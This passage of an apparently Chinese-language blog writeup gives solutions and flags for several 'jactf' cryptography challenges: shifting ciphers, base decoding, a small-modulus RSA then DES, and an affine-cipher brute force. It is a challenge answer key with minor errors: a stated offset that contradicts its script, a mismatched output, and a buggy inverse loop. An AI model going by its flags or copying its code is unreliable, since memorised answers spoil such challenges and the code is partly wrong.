</code></pre><p>得到flag</p>
<pre><code>jactf{hex_is_easy}
</code></pre><h3 id="罗马帝国的奠基者"><a href="#罗马帝国的奠基者" class="headerlink" title="罗马帝国的奠基者"></a>罗马帝国的奠基者</h3><p>给了一些奇怪的字符串</p>
<pre><code>h^_o`[pZi^i`
</code></pre><p>这和jactf前五个字符的ascii码值相差2，3，4，5，6</p>
<p>编写脚本</p>
<pre><code>str = &quot;h^_o`[pZi^i`&quot;
flag = &quot;&quot;
c=2
for i in range(len(str)):
      flag += chr(ord(str[i])+c)
      c=c+1
print flag
</code></pre><p>得到flag：</p>
<pre><code>jactf{bxcsium}
</code></pre><h3 id="贝斯家族三英战群魔"><a href="#贝斯家族三英战群魔" class="headerlink" title="贝斯家族三英战群魔"></a>贝斯家族三英战群魔</h3><p>看到这个题目就这到和basae解码有关</p>
<p>打开txt文件是一长串的字符串</p>
<p>对其进行base16，base32，base64循环解码 就能得到flag</p>
<pre><code>jactf{4(b64_32_16)}
</code></pre><h3 id="绝密文件"><a href="#绝密文件" class="headerlink" title="绝密文件"></a>绝密文件</h3><p>打开文件</p>
<pre><code>作为我潜伏在宝岛地下工作者小菜截获了一段绝密的情报，具体如下：
WzI2NDAzMjMxMEwsIDQ5NTA2MzczNDFMLCA0MTg5MTM3MjM1TCwgMzUwMzY3NTkwNkwsIDExOTMyNzJMLCAzNzQ1MzA5NjhMLCA1MTg5MjgxNTMxTCwgMjUxNDIwMDI3MkwsIDQ0NTQzMDU1ODFMLCA2NDEwNzg1OTdMLCA0Mzk1OTMxNjU5TCwgMjcxNjQyNjU5OUwsIDQzNzUzOTE5NEwsIDM0NDgwMTM1OTZMLCAzMDcyMDcyMDlMLCA0NzUwODIwNjA2TCwgMzI1MDQwNzk5M0wsIDg1MzkwNTIwOUwsIDIxMDk3OTExNTlMLCAyNzE2NDI2NTk5TCwgMjEwNzg5OTU1NEwsIDQzOTU5MzE2NTlMLCAyNzk0Mzg0NTk4TCwgMjEwOTc5MTE1OUwsIDUyOTc3NzkwOTRMLCAxNDYwODc0Mjg2TCwgMTQ2MDg3NDI4NkwsIDc5NDkzMTY3OUwsIDc5NDkzMTY3OUwsIDU0NDcwNTE2MjJMLCA4NTM5MDUyMDlMLCAzMTk4MzQwMjE4TCwgMTE5MzI3MkwsIDE5MTIzMjMxMDFMLCA1Mjk3Nzc5MDk0TCwgMzA3MjA3MjA5TCwgMzIzMTU3MjYwOEwsIDMxOTgzNDAyMThMLCA1MTg5MjgxNTMxTCwgNTI3ODg5NTQ4TCwgNDk1MDYzNzM0MUwsIDI4MzkzNjY4MDVMLCAxMTE2NDU3MzU0TCwgNTI3ODg5NTQ4TCwgNTI5Nzc3OTA5NEwsIDMyNTA0MDc5OTNMLCA0NDU0MzA1NTgxTCwgNjUxMDM5MkwsIDMyNTA0MDc5OTNMLCAxNDYwODc0Mjg2TCwgMTA1OTAzNTEyOUwsIDMyMDAzNTk2MTJMLCA4NTM5MDUyMDlMLCAzMDcyMDcyMDlMLCAxNTY3NzkxMDFMLCAyMTQ1MzAxMzI4TCwgNTI3ODg5NTQ4TCwgMTA1OTAzNTEyOUwsIDU0NjgwMjUwNzJMLCAzNDQ4MDEzNTk2TCwgMjEwNzg5OTU1NEwsIDQxODkxMzcyMzVMLCAzNTAzNjc1OTA2TCwgMjY1MzQzNjExM0x

而且小菜昨天偷听到了一部分关于情报的绝密资料，如下：N=5520780427 , e = 134257,你能帮小菜解出这段情报吗？
</code></pre><p>base64解密获得</p>
<pre><code>[264032310L, 4950637341L, 4189137235L, 3503675906L, 1193272L, 374530968L, 5189281531L, 2514200272L, 4454305581L, 641078597L, 4395931659L, 2716426599L, 437539194L, 3448013596L, 307207209L, 4750820606L, 3250407993L, 853905209L, 2109791159L, 2716426599L, 2107899554L, 4395931659L, 2794384598L, 2109791159L, 5297779094L, 1460874286L, 1460874286L, 794931679L, 794931679L, 5447051622L, 853905209L, 3198340218L, 1193272L, 1912323101L, 5297779094L, 307207209L, 3231572608L, 3198340218L, 5189281531L, 527889548L, 4950637341L, 2839366805L, 1116457354L, 527889548L, 5297779094L, 3250407993L, 4454305581L, 6510392L, 3250407993L, 1460874286L, 1059035129L, 3200359612L, 853905209L, 307207209L, 156779101L, 2145301328L, 527889548L, 1059035129L, 5468025072L, 3448013596L, 2107899554L, 4189137235L, 3503675906L, 2653436113L]
</code></pre><p>对n进行因式分解获得pq</p>
<p><a href="http://factordb.com/index.php" target="_blank" rel="noopener">分解p q网站</a></p>
<p>然后一个解密脚本</p>
<pre><code># encoding:utf8
import rsa
import sys
import gmpy2


marr= [264032310L, 4950637341L, 4189137235L, 3503675906L, 1193272L, 374530968L, 5189281531L, 2514200272L, 4454305581L, 641078597L, 4395931659L, 2716426599L, 437539194L, 3448013596L, 307207209L, 4750820606L, 3250407993L, 853905209L, 2109791159L, 2716426599L, 2107899554L, 4395931659L, 2794384598L, 2109791159L, 5297779094L, 1460874286L, 1460874286L, 794931679L, 794931679L, 5447051622L, 853905209L, 3198340218L, 1193272L, 1912323101L, 5297779094L, 307207209L, 3231572608L, 3198340218L, 5189281531L, 527889548L, 4950637341L, 2839366805L, 1116457354L, 527889548L, 5297779094L, 3250407993L, 4454305581L, 6510392L, 3250407993L, 1460874286L, 1059035129L, 3200359612L, 853905209L, 307207209L, 156779101L, 2145301328L, 527889548L, 1059035129L, 5468025072L, 3448013596L, 2107899554L, 4189137235L, 3503675906L, 2653436113L]
p = 54163
q = 101929 
n = 5520780427 
e = 134257 
d= int(gmpy2.invert(e , (p-1) * (q-1))) 
result=&quot;&quot;
for j in marr:
  result += chr(pow(j,d,n))
print  result

</code></pre><p>得到</p>
<pre><code>U2FsdGVkX1/8DKBmhvO87/SOLaawwxvAdHLB9AV62nC6LhXzhatpvBcg6tlK7Fs5
</code></pre><p>对其进行DES解密  得到flag</p>
<p><img src="https://s2.ax1x.com/2019/04/10/ATetVf.png" alt="image"></p>
<pre><code>jactf{So_easy_RSA_and_DES}

</code></pre><h3 id="贝叶斯"><a href="#贝叶斯" class="headerlink" title="贝叶斯"></a>贝叶斯</h3><p>打开是一个密码本 需要解密 仿射密码</p>
<p>脚本如下</p>
<pre><code>#include &lt;iostream&gt;
#include &lt;cstring&gt;

using namespace std;
int gcd(int m, int n);
int init_gcd(int m, int n);
int des_find(string p, int m);

#define PSIZE 65   //宏定义密码表大小


int main()
{
  string P(&quot;zQWERTYUIOPxcvbnmasdfASDFGHJKLghjkl_qwZXCVBNMert{yuiop}0123498765&quot;), M(&quot;gf9C{YQ34KHN3sOwhCz3RzH3CKj3Ndpm1Bt7&quot;);   //明文空间，与已知密文
  string C;  //存放解密明文


  int i = 2;   //求解所有互素的数
  int a1;  //存放逆元

  for (i; i &lt; PSIZE; i++)
  {
    if (gcd(i, PSIZE) == 1)
    {  //说明此时的i与28互素
      /***求解此时的i的逆元***/
      a1 = init_gcd(i, PSIZE);


      for (int j = 0; j &lt; PSIZE; j++)   //控制b的遍历
      {
        cout &lt;&lt; &quot;此时：a=&quot; &lt;&lt; i &lt;&lt; &quot; b=&quot; &lt;&lt; j &lt;&lt; &quot; a的逆元为：&quot; &lt;&lt; a1 &lt;&lt; &quot;   \&quot;&quot;;
        for (int k = 0; k &lt; M.length(); k++) {     //每一个汉字站两个字节，所以要用两个数组空间来存
          int where = des_find(P, M[k]);   //匹配密文在明文空间的位置
          where = ((where - j)*a1) % PSIZE;
          if (where &lt; 0) {
            where += PSIZE;
          }

          cout &lt;&lt; P[where];
        }
        cout &lt;&lt; &quot;\&quot;&quot; &lt;&lt; endl;
      }

    }
  }

  return 0;
}

int gcd(int b, int a)    //求互素
{
  int temp;
  if (a &lt; b)//判断大小
  {
    temp = a;
    a = b;
    b = temp;
  }
  if (b == 0) return a;
  else return gcd(b, a%b);//递归
}

int init_gcd(int m, int n)   //扩展欧几里得算法
{
  int i = 2;
  for (i; i &lt; 28; i++)
  {
    if ((m*i) % n == 1)
    {
      return i;
    }
  }
}

int des_find(string p, int m)   //位置匹配函数
{
  for (int i = 0; i &lt; p.length(); i ++) {
    //cout&lt;&lt;p[i]&lt;&lt;p[i+1]&lt;&lt;endl;
    if (m == p[i]) {
      return  i;
    }
  }
}
</code></pre><p>跑出来  找到了flag</p>
<p><img src="https://s2.ax1x.com/2019/04/10/ATevzd.png" alt="image"></p>
<pre><code>jactf{I_10ve_Crypto_Yov_t0O_e8963F5}
</code></pre><h3 id="不会奔跑的数字和下划线"><a href="#不会奔跑的数字和下划线" class="headerlink" title="不会奔跑的数字和下划线"></a>不会奔跑的数字和下划线</h3><p>打开题目发现是 url加密</p>
<p>加密之后  进行base16解密  最后进行base64解密</p>
<p>得到 和flag长得相似的字符串</p>
<pre><code>NEGXJ{48_ter_119_xsoirw_teww}
</code></pre><p>根据题目 我们只考虑字母<br>发现这一些字符前五位和JACTF的ascii码相差5</p>
<pre><code>str = &quot;NEGXJ{48_ter_119_xsoirw_teww}&quot;
str_2 = &quot;NEGXJterxsoirwteww&quot;
flag = &quot;&quot;
x = 4
for i in str:
    if i.isalpha():
        flag += chr(int(ord(i)-x))
    else:
        flag += i

print flag
</code></pre><p>得到flag:</p>
<pre><code>JACTF{48_pan_119_tokens_pass}
</code></pre>
                <hr>
                <div>
                    <p>
                         
                        <span class="badge badge-light">#&nbsp;writeup</span>
                        &nbsp;
                        
                    </p>
                </div>
                <br>
                
            </div>
        </div>
        <div class="d-none d-md-block col-md-2">
            
  <div id="toc" class="py-5">
    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
    <div id="tocbot"></div>
  </div>

        </div>
    </div>        
</div>

<br><br><br>

<!-- Comments -->
<div class="comments" id="comments">
 
</div>
  
  </main>

<footer class="mt-5">
  <div class="text-center py-3">
    <a href="https://hexo.io" target="_blank"><b>HEXO</b></a>
    <i class="iconfont icon-love"></i>
    <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
  </div>
</footer>

  <!-- SCRIPTS -->
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/jquery-3.3.1.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/popper.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/bootstrap.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/mdb.min.js"></script>
  <script src="/js/main.js"></script>
  
    
      <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    
    <script src="/js/post.js"></script>
    
      <script src="/js/plugins/prettify.js"></script>
      <script>
          $(document).ready(function(){
              $('pre').addClass('prettyprint linenums');
              prettyPrint();
          })
      </script>
    
  
</body>
</html>